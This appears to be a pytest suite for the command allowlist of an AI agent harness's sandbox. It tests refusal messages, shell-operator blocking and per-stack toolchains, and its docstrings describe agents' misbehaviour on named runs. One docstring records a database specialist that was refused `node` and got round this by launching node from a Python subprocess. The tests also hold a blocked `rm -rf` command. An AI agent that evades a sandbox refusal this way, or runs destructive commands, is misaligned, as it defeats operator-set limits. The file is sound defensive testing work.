def test_a_refusal_is_not_cleared_by_a_write(tmp_path) -> None:
    """The asymmetry between a refusal and a failure.

    Measured on run-ae4b717e's `specialist_backend_0`: `node -e "..."` refused
    at 23:44:29 with a message naming the way round, edits and a delete in
    between, then the identical command again at 23:44:41. A write gate would
    have called that a fresh situation and said nothing - but the allowlist
    refuses this command for what it is, and no edit can change that.
    """
    import time

    from app.tools.sandbox import _record_execution, refused_this_way_before

    command = ["node", "-e", "console.log(1)"]
    _record_execution(str(tmp_path), "backend_specialist", command, {"error": "not permitted"})
    assert refused_this_way_before(str(tmp_path), command) == 1

    time.sleep(0.01)
    (tmp_path / "changed.js").write_text("v2\n", encoding="utf-8")

    assert refused_this_way_before(str(tmp_path), command) == 1


def test_a_failure_is_not_counted_as_a_refusal(tmp_path) -> None:
    """A command that ran and exited non-zero was allowed to run."""
    from app.tools.sandbox import _record_execution, refused_this_way_before

    command = ["node", "verify.js"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 1})

    assert refused_this_way_before(str(tmp_path), command) == 0


def test_only_the_allowlist_makes_a_refusal_standing() -> None:
    """A timeout is not a property of the command, so it must not qualify.

    An edit can end an infinite loop and a busy machine frees up; telling an
    agent "this will be refused every time" about either would be false.
    """
    from app.tools.sandbox import _is_a_standing_refusal

    assert _is_a_standing_refusal(["node", "-e", "x"], "backend_specialist") is True
    assert _is_a_standing_refusal(["node", "--test", "a.mjs"], "backend_specialist") is False


def test_the_note_tells_a_repeated_refusal_to_use_another_command(tmp_path) -> None:
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["node", "-e", "console.log(1)"]
    root = str(tmp_path)
    refusal = {"error": "'node -e' is not permitted: it can execute arbitrary code."}

    assert _note_about_running_this_again(root, command, refusal, "backend_specialist") == ""

    _record_execution(root, "backend_specialist", command, refusal)
    note = _note_about_running_this_again(root, command, refusal, "backend_specialist")

    assert "already been refused 1 time(s)" in note
    assert "no edit to any file will change the answer" in note


def test_a_timed_out_command_gets_no_standing_refusal_note(tmp_path) -> None:
    """It ran, it was allowed, and changing the file it runs may well fix it."""
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["node", "--test", "slow.mjs"]
    root = str(tmp_path)
    timed_out = {"error": "Command timed out after 120 seconds."}
    _record_execution(root, "testing_specialist", command, timed_out)

    assert _note_about_running_this_again(root, command, timed_out, "testing_specialist") == ""


def test_every_specialist_can_run_the_code_it_may_be_asked_to_write():
    """The stack is chosen per run, so no role's language is known in advance.

    A specialist is handed whatever the Technical Lead delegates, in whatever
    stack the stack selector picked. A role that can write a file it cannot
    run has only bad options, and it takes them: on run-414a621f the database
    specialist, refused `node`, wrote a Python script to subprocess-launch node
    (permitted), ran `python3 app.test.mjs`, and finally tried to `exec()` a
    JavaScript module as Python.

    This has been fixed one role at a time four times - `ui_ux` on
    run-0b55ad49, `backend` on run-95ca3f72, `testing` on run-3da8dd91,
    `database` on run-414a621f. Asserted across the whole set so there is no
    fifth.
    """
    import typing

    from app.agents.technical_lead import SpecialistRole
    from app.tools.sandbox import ROLE_EXECUTABLES

    without_javascript = []
    without_python = []
    for role in typing.get_args(SpecialistRole):
        allowed = ROLE_EXECUTABLES[f"{role}_specialist"]
        if not {"node", "npx"} & allowed:
            without_javascript.append(role)
        if not {"python", "python3"} & allowed:
            without_python.append(role)

    assert not without_javascript, f"cannot run JavaScript: {without_javascript}"
    assert not without_python, f"cannot run Python: {without_python}"


def test_a_search_that_found_nothing_is_not_called_a_failure(tmp_path) -> None:
    """`grep` exits 1 when it matches nothing, which is an answer.

    Counting it as a failure told run-1c522244's `specialist_ui_ux_1` that a
    working command "had already failed" and to "change the command, or change
    the file it runs". It ran the identical grep twelve times and the run died
    on the repeat guard at 1,132 events.
    """
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["grep", "-n", r"\.delete-btn", "todo-app/style.css"]
    _record_execution(str(tmp_path), "ui_ux_specialist", command, {"returncode": 1})
    _record_execution(str(tmp_path), "ui_ux_specialist", command, {"returncode": 1})

    assert failed_this_way_before(str(tmp_path), command) == 0


def test_a_repeated_fruitless_search_is_still_worth_mentioning(tmp_path) -> None:
    """Not a failure, but not new information either."""
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["grep", "-n", "nothing-here", "style.css"]
    root = str(tmp_path)
    found_nothing = {"returncode": 1, "stdout": "", "stderr": ""}

    assert _note_about_running_this_again(root, command, found_nothing, "r") == ""

    _record_execution(root, "r", command, found_nothing)
    note = _note_about_running_this_again(root, command, found_nothing, "r")

    assert "found no matches" in note
    assert "the command worked" in note
    assert "failed" not in note
    assert "change the file it runs" not in note


def test_a_grep_that_genuinely_broke_is_still_a_failure(tmp_path) -> None:
    """Exit 2 is grep's "I could not do that" - a real failure."""
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["grep", "-n", "[", "style.css"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 2})

    assert failed_this_way_before(str(tmp_path), command) == 1


def test_only_commands_that_answer_that_way_are_excused(tmp_path) -> None:
    """A test suite exiting 1 has failed, and must keep saying so."""
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["node", "--test", "app.test.mjs"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 1})

    assert failed_this_way_before(str(tmp_path), command) == 1


def test_a_command_line_packed_into_one_argument_says_so() -> None:
    """The refusal used to list the program it was refusing.

    Measured on run-1c522244: `["wc -l", "todo-app/style.css"]` was answered
    with "'wc -l' is not permitted for role 'ui_ux_specialist'. Allowed: ...,
    wc, ..." - true, and useless. The problem is not a permission, and an agent
    told it is will go looking for the wrong fix. Three calls went that way
    across two roles.
    """
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["wc -l", "todo-app/style.css"], "ui_ux_specialist")

    message = str(caught.value)
    assert "is not permitted" not in message
    assert "no shell here" in message
    assert "'wc', '-l', 'todo-app/style.css'" in message


def test_a_genuinely_forbidden_program_still_says_it_is_not_permitted() -> None:
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    with pytest.raises(CommandNotAllowed, match="is not permitted for role"):
        validate_command(["curl -s", "http://example.com"], "ui_ux_specialist")


def test_the_ordinary_refusal_is_unchanged() -> None:
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    with pytest.raises(CommandNotAllowed, match="is not permitted for role"):
        validate_command(["curl", "http://example.com"], "ui_ux_specialist")


def test_node_cannot_syntax_check_a_stylesheet() -> None:
    """A failure that no edit can fix, so the write-gated note never speaks.

    `node --check style.css` throws ERR_UNKNOWN_FILE_EXTENSION - it fails for
    what the file is, not what it contains. Measured on run-fa7b7286:
    `specialist_ui_ux_0` ran the identical command twice, two minutes apart,
    editing files in between, so the "you already tried this" gate correctly
    saw a changed workspace and stayed silent both times about a command that
    could not work either time.
    """
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["node", "--check", "task-manager/style.css"], "ui_ux_specialist")

    message = str(caught.value)
    assert "only handles .js, .mjs and .cjs" in message
    # It must say what to do instead, or it is just another refusal.
    assert "read_file" in message


def test_node_can_still_check_javascript() -> None:
    from app.tools.sandbox import validate_command

    for name in ("app.js", "app.mjs", "app.cjs"):
        assert validate_command(["node", "--check", name], "ui_ux_specialist")


def test_only_check_is_affected() -> None:
    """`node --test` and `node file.js` decide differently; leave them alone."""
    from app.tools.sandbox import validate_command

    assert validate_command(["node", "--test", "a.test.mjs"], "testing_specialist")
    assert validate_command(["node", "app.js"], "backend_specialist")


def test_the_ledger_separates_the_same_command_in_different_places(tmp_path) -> None:
    """Keying on argv alone answered "you already ran this" from the wrong history.

    run-44653bd2 ran `node --test` under `/simple-to-do-list-app` and under
    `simple-to-do-list-app`. The ledger recorded argv only, so the two were one
    entry. Keying on argv alone is the mistake finding 68 already made once.
    """
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["node", "--test"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 1}, "/proj", "test")

    # The same place, spelled the other way.
    assert failed_this_way_before(str(tmp_path), command, "proj") == 1
    # A different place is a different command.
    assert failed_this_way_before(str(tmp_path), command, "elsewhere") == 0
    # The workspace root is not the project directory.
    assert failed_this_way_before(str(tmp_path), command, None) == 0


def test_an_entry_written_before_the_directory_was_recorded_still_matches(tmp_path) -> None:
    """An upgrade mid-run degrades to the old behaviour, not to "never run"."""
    import json

    from app.tools.sandbox import _ledger_path, failed_this_way_before

    path = _ledger_path(str(tmp_path))
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps({"at": "2026-01-01T00:00:00+00:00", "role": "r",
                    "command": ["node", "--test"], "returncode": 1}) + "\n",
        encoding="utf-8",
    )

    assert failed_this_way_before(str(tmp_path), ["node", "--test"], "anywhere") == 1


def test_the_stack_a_run_chose_opens_its_toolchain(tmp_path) -> None:
    """The static table was right for the stacks it listed and silently wrong
    for the rest.

    `go` and `cargo` appeared under one role; `dotnet`, `mvn`, `ruby`, `php`,
    `swift` and `dart` under none. A product in any of those could be written
    and never run - and finding 82 was already the fourth time `node` had been
    added to one role at a time.
    """
    from app.tools.sandbox import allowed_executables, pin_project_stack

    assert "go" not in allowed_executables("database_specialist", str(tmp_path))

    pin_project_stack(tmp_path, "Go")

    for role in ("database_specialist", "ui_ux_specialist", "testing_specialist"):
        assert "go" in allowed_executables(role, str(tmp_path)), role


def test_the_language_is_read_as_a_model_writes_it(tmp_path) -> None:
    from app.tools.sandbox import _toolchain_key

    assert _toolchain_key("JavaScript (ES6+)") == "javascript"
    assert _toolchain_key("Python 3.12") == "python"
    assert _toolchain_key("golang") == "go"
    assert _toolchain_key("C#") == "csharp"
    assert _toolchain_key("Fortran") is None


def test_a_role_that_writes_no_code_gains_nothing(tmp_path) -> None:
    """Reviewers read; they do not need a compiler."""
    from app.tools.sandbox import allowed_executables, pin_project_stack

    pin_project_stack(tmp_path, "Rust")

    assert "cargo" not in allowed_executables("security_reviewer", str(tmp_path))
    assert "cargo" in allowed_executables("backend_specialist", str(tmp_path))


def test_an_unknown_role_is_still_given_the_least(tmp_path) -> None:
    """A typo in a role name must never widen the allowlist."""
    from app.tools.sandbox import COMMON_EXECUTABLES, allowed_executables, pin_project_stack

    pin_project_stack(tmp_path, "Go")

    assert allowed_executables("not_a_role", str(tmp_path)) == COMMON_EXECUTABLES


def test_every_language_in_the_table_can_run_something(tmp_path) -> None:
    """A key with an empty toolchain would pin a stack and grant nothing."""
    from app.tools.sandbox import TOOLCHAINS

    for language, executables in TOOLCHAINS.items():
        assert executables, language


def test_the_workflow_pins_the_stack_it_chose() -> None:
    """The allowlist is only stack-aware if something records the stack.

    Reaching the table and never writing the marker is the shape of a check
    that is present and never fires - which this session found three times.
    """
    import inspect

    from app.graph import workflow

    source = inspect.getsource(workflow)
    # Bounded by the next node, not by a character count that drifts with the
    # body it is measuring.
    node = source[source.index("def tools_models_node") : source.index("def stack_selector_node")]

    assert "pin_project_stack(" in node


def test_a_shell_redirect_is_refused_rather_than_silently_doing_nothing() -> None:
    """A silent no-op reported as success is the worst shape a result can have.

    `["echo", "export {};", ">", "app.js"]` runs echo with three arguments. It
    prints them, exits 0, and writes nothing - so the agent is told its command
    succeeded and believes the file exists.

    Measured on run-fff9bf89: `specialist_backend_2` did exactly that twice,
    for `app.js` and `simple-to-do-list-app/app.js`. Both "succeeded". Neither
    file was written. An exit code of zero is the most convincing lie a tool
    can tell.
    """
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["echo", "export {};", ">", "app.js"], "backend_specialist")

    message = str(caught.value)
    assert "no shell here" in message
    # It must name the tool that does work, or the agent tries another spelling.
    assert "write_artifact" in message


@pytest.mark.parametrize(
    "command",
    [
        ["cat", "a.js", "|", "grep", "x"],
        ["node", "--test", "&&", "echo", "ok"],
        ["echo", "x", ">>", "log.txt"],
        ["node", "app.js", ";", "echo", "done"],
        ["cat", "<", "input.txt"],
    ],
)
def test_every_operator_that_needs_a_shell_is_refused(command) -> None:
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    with pytest.raises(CommandNotAllowed, match="no shell here"):
        validate_command(command, "backend_specialist")


@pytest.mark.parametrize(
    "command",
    [
        ["echo", "hello"],
        ["node", "--test", "app.test.mjs"],
        # An operator inside an argument is text, not an operator.
        ["grep", "-n", "a>b", "file.js"],
        ["grep", "-n", "a||b", "file.js"],
        ["find", ".", "-name", "*.js"],
        ["node", "--check", "app.js"],
    ],
)
def test_ordinary_commands_are_untouched(command) -> None:
    from app.tools.sandbox import validate_command

    assert validate_command(command, "backend_specialist")


def test_the_executable_itself_is_never_read_as_an_operator() -> None:
    """Only arguments are checked; argv[0] is handled by the allowlist."""
    from app.tools.sandbox import validate_command

    assert validate_command(["echo", "a", "b"], "backend_specialist")


# --- what to do instead of a command that will never be allowed ------------


def test_a_refused_rm_names_the_tool_that_does_it() -> None:
    """The allowlist says what may be run; it does not say how to do the job.

    run-130deeef's backend specialist sent `rm -rf simple-to-do-list-app/tests`
    and was handed twenty-six program names. `delete_artifact` exists.
    """
    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["rm", "-rf", "x"], "backend_specialist")

    assert "delete_artifact" in str(caught.value)


def test_a_refused_shell_script_says_there_is_no_shell() -> None:
    """`sh ./build.sh` five times in one stage, each answered with a list."""
    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["sh", "./build.sh"], "backend_specialist")

    message = str(caught.value)
    assert "no shell here" in message
    assert "one `run_terminal_command` per command" in message


def test_a_command_with_no_obvious_substitute_still_lists_what_is_allowed() -> None:
    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["ruby", "x.rb"], "backend_specialist")

    # "Allowed:" or "Allowed and installed:" depending on what is on PATH
    # where the suite runs, which is not the same image as the worker.
    assert "Allowed" in str(caught.value)


# --- the doubled project directory, however the path is spelled -------------


@pytest.mark.parametrize(
    "argument",
    ["proj/app.test.mjs", "./proj/app.test.mjs", "/proj/app.test.mjs"],
)
def test_a_doubled_project_directory_is_stripped_however_it_is_written(
    tmp_path, argument: str
) -> None:
    """`./project/x` and `/project/x` mean the same as `project/x` to the model,
    and it writes all three.

    Comparing the raw string missed the first two. run-04576307 sent
    `["node", "--test", "./simple-to-do-list-app/app.test.mjs"]` with
    `working_directory` already set to the project, and the guard written for
    exactly that shape did not fire over one `.`. The command then looked for
    `simple-to-do-list-app/simple-to-do-list-app/app.test.mjs`.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj" / "app.test.mjs").write_text("x", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "--test", argument], str(tmp_path), "proj"
    )

    assert command[-1] == "app.test.mjs"
    assert note


def test_a_project_that_really_nests_its_own_name_is_untouched(tmp_path) -> None:
    """The safety property: rewritten only when the path as given does not
    exist and the stripped one does."""
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "proj" / "proj").mkdir(parents=True)
    (tmp_path / "proj" / "proj" / "x.mjs").write_text("y", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "./proj/x.mjs"], str(tmp_path), "proj"
    )

    assert command[-1] == "./proj/x.mjs"
    assert not note


def test_a_path_that_is_already_right_is_untouched(tmp_path) -> None:
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj" / "app.test.mjs").write_text("x", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "--test", "app.test.mjs"], str(tmp_path), "proj"
    )

    assert command[-1] == "app.test.mjs"
    assert not note


# --- the allowlist told specialists about programs that are not installed ---


def test_the_refusal_separates_what_runs_from_what_must_be_installed(monkeypatch) -> None:
    """Of 34 allowlisted names across all roles, sixteen were absent from the
    deployed worker image - `alembic cargo go jasmine jest karma make mocha
    pnpm prisma psql pytest tsc uv vitest yarn`.

    `make` is the one this harness itself recommends, in the refusal that
    explains there is no shell. A specialist told "Allowed: ... make ..." tries
    it, is told "not found", and has been handed an environment fault it cannot
    fix - the shape that turned run-130deeef into five identical `sh` attempts
    and then a blocker loop.
    """
    import app.tools.sandbox as sandbox

    monkeypatch.setattr(
        sandbox.shutil, "which", lambda name: "/usr/bin/" + name if name == "node" else None
    )

    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["ruby", "x.rb"], "backend_specialist")

    message = str(caught.value)
    assert "Allowed and installed: node" in message
    assert "NOT installed" in message
    assert "make" in message.split("NOT installed")[1], "make is on the absent side"
    assert "npx <tool>" in message, "say how to get one"


def test_nothing_missing_means_the_plain_sentence(monkeypatch) -> None:
    import app.tools.sandbox as sandbox

    monkeypatch.setattr(sandbox.shutil, "which", lambda name: "/usr/bin/" + name)

    with pytest.raises(CommandNotAllowed) as caught:
        validate_command(["ruby", "x.rb"], "backend_specialist")

    message = str(caught.value)
    assert "Allowed: " in message
    assert "NOT installed" not in message


def test_the_allowlist_itself_is_unchanged(monkeypatch) -> None:
    """This narrows what is advertised, never what is permitted: `pip install
    pytest` must still leave `pytest` runnable."""
    import app.tools.sandbox as sandbox

    monkeypatch.setattr(sandbox.shutil, "which", lambda name: None)

    assert validate_command(["pytest", "-q"], "testing_specialist") == ["pytest", "-q"]


def test_the_no_shell_advice_does_not_name_an_absent_program() -> None:
    """It used to say "a Makefile target"; `make` is not in the image."""
    from app.tools.sandbox import _what_to_do_instead

    advice = _what_to_do_instead("sh")

    assert "Makefile" not in advice
    assert "npm run" in advice
